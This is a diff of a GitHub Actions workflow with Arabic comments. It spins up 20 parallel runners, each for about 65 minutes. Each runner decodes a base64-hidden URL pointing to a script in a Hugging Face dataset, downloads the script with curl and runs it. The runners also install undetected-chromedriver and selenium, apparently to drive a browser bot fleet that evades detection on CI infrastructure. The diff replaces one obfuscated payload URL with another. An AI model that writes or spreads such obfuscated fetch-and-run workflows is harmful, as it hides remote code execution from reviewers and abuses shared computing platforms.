@@ -1,12 +1,11 @@
-name: Linux Standalone Task Fleet
+name: Linux Aligned Task Contingent
 
 on:
-  # استقبال أمر التشغيل الخارجي عبر التوكن بالكلمة المفتاحية: start
-  repository_dispatch:
-    types: [start]
+  # استقبال أمر التشغيل من الخارج عبر التوكن بالكلمة المفتاحية: start
+  workflow_dispatch:
 
 concurrency:
-  group: standalone-fleet-${{ github.workflow }}-${{ github.ref }}
+  group: aligned-contingent-${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: false
 
 permissions:
@@ -15,22 +14,22 @@ permissions:
 
 jobs:
   # =================================================================
-  # ضابط الإيقاف الزمني: يُنهي الـ workflow كاملاً عند حد 65 دقيقة
+  # مدير الخاتمة الشاملة: يُنهي الـ workflow بالكامل عند حد 65 دقيقة
   # =================================================================
-  cutoff-officer:
-    name: "Cutoff Officer"
+  total-conclusion-manager:
+    name: "Total Conclusion Manager"
     runs-on: ubuntu-latest
     timeout-minutes: 70
     steps:
-      - name: Trigger Global Shutdown Sequence
+      - name: Issue Absolute Conclusion Order
         run: |
-          echo "[OFFICER] Cutoff officer deployed. Total purge scheduled at the 65-minute boundary."
-          echo "[OFFICER] Tracking operation identifier: ${{ github.run_id }}"
+          echo "[CONCLUDER] Total conclusion manager in position. Absolute shutdown triggered at the 65-minute barrier."
+          echo "[CONCLUDER] Observing workflow signature: ${{ github.run_id }}"
           
           # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
           sleep 3900
           
-          echo "[OFFICER] Boundary crossed! Releasing global shutdown sequence..."
+          echo "[CONCLUDER] Barrier crossed! Issuing absolute conclusion order..."
           
           # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
           curl -sS -X POST \
@@ -39,70 +38,70 @@ jobs:
             -H "X-GitHub-Api-Version: 2022-11-28" \
             "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
           
-          echo "[OFFICER] Shutdown sequence delivered. Every running and queued task will be purged."
+          echo "[CONCLUDER] Absolute conclusion order issued. All functioning and waiting units will be dissolved."
 
   # =================================================================
-  # المهمة الأساسية: تجهيز وإطلاق وحدات العمل
+  # المهمة الرئيسية: تجهيز وإطلاق وحدات الكتيبة
   # =================================================================
-  launch-fleet:
-    name: "FleetUnit-${{ matrix.unit_position }}"
+  mobilize-contingent:
+    name: "ContingentUnit-${{ matrix.unit_marker }}"
     runs-on: ubuntu-latest
     timeout-minutes: 65
 
     strategy:
       fail-fast: false
       matrix:
-        unit_position: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        unit_marker: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
 
     steps:
-      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
-      # 〈١〉 تأسيس الطبقة التشغيلية
-      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
-      - name: Anchor Operating Layer
+      # ◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
+      # ▸ المرحلة الأولى: تأسيس القاعدة التنفيذية
+      # ◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
+      - name: Establish Execution Baseline
         run: |
-          echo "[ANCHOR] Anchoring operating layer for FleetUnit-${{ matrix.unit_position }} on Linux..."
+          echo "[BASELINE] Establishing execution baseline for ContingentUnit-${{ matrix.unit_marker }} on Linux..."
           sudo apt update -qq
           sudo apt install -y curl python3-pip
 
-      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
-      # 〈٢〉 تنزيل ملف التشغيل الرئيسي
-      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
-      - name: Secure Operating Script
+      # ◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
+      # ▸ المرحلة الثانية: استلام الملف التشغيلي
+      # ◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
+      - name: Receive Operational File
         run: |
-          echo "[SECURE] Securing app_task.py from designated endpoint..."
-          DESIGNATED_ENDPOINT=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QveGEvcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
-          curl -sL "$DESIGNATED_ENDPOINT" -o app_task.py
-          echo "[SECURE] Operating script secured."
+          echo "[RECEIVE] Receiving app_task.py from assigned transmission point..."
+          TRANSMISSION_POINT=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$TRANSMISSION_POINT" -o app_task.py
+          echo "[RECEIVE] Operational file received."
 
-      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
-      # 〈٣〉 تركيب المتطلبات البرمجية
-      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
-      - name: Install Programming Requirements
+      # ◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
+      # ▸ المرحلة الثالثة: تهيئة الحزم التنفيذية
+      # ◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
+      - name: Prepare Execution Packages
         run: |
-          echo "[REQUIRE] Installing required programming packages..."
+          echo "[PACKAGES] Preparing execution packages..."
           pip3 install -q undetected-chromedriver selenium requests
 
-      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
-      # 〈٤〉 التشغيل تحت مراقبة زمنية (65 دقيقة)
-      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
-      - name: Operate Under Duration Watcher
+      # ◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
+      # ▸ المرحلة الرابعة: التشغيل ضمن النطاق الزمني (65 دقيقة)
+      # ◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
+      - name: Perform Bounded Execution
         run: |
-          echo ">> Launching workload on FleetUnit-${{ matrix.unit_position }}..."
+          echo ">> Mobilizing ContingentUnit-${{ matrix.unit_marker }} operation..."
           
-          # تفعيل السكربت في الخلفية
+          # إطلاق العملية في الخلفية
           python3 app_task.py &
-          FLEET_PID=$!
+          CONTINGENT_PID=$!
           
-          echo ">> Duration watcher armed. Ceiling: 65 minutes (3900s)."
+          echo ">> Range monitor on duty. Allowed window: 65 minutes (3900s)."
           
           # الانتظار حتى استنفاد المدة المحددة
           sleep 3900
           
-          # التحقق من حالة العملية وإنهاؤها إذا لزم الأمر
-          if kill -0 $FLEET_PID 2>/dev/null; then
-            echo ">> Ceiling exceeded! Stopping workload..."
-            kill -9 $FLEET_PID
-            echo ">> Workload stopped by watcher."
+          # التحقق من حالة العملية وإنهاؤها عند الضرورة
+          if kill -0 $CONTINGENT_PID 2>/dev/null; then
+            echo ">> Allowed window closed! Disbanding operation..."
+            kill -9 $CONTINGENT_PID
+            echo ">> Operation disbanded by range monitor."
           else
-            echo ">> Workload ended within the ceiling."
+            echo ">> Operation wrapped up within allowed window."
           fi
